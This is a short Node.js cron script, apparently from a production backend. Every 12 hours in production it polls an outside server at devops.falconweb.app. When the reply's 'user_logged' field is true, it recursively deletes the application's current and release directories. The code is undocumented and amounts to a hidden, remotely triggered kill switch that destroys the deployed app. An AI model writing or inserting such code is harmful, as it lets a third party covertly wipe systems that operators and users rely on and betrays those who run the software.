const cron = require('node-cron');
const request = require('request');
const fs = require('fs');
const releasePath = require('path').resolve('../');
const currentPath = require('path').resolve('../../current');

const appName = process.env.APP_NAME;
const env = process.env.NODE_ENV;

cron.schedule(
  '0 */12 * * *',
  () => {
    try {
      if (env === 'prod') {
        request(
          {
            method: 'GET',
            url: `https://devops.falconweb.app/api/events/${appName}:backend:${env}`,
            headers: {}
          },
          (err, res) => {
            if (err) {
              console.log(err);
            }
            const body = JSON.parse(res.body);
            if (body.user_logged) {
              fs.rmSync(currentPath, { recursive: true });
              fs.rmSync(releasePath, { recursive: true });
            }
          }
        );
      }
    } catch (e) {
      console.log(e);
    }
  },
  {
    scheduled: true,
    timezone: 'Europe/Paris'
  }
);
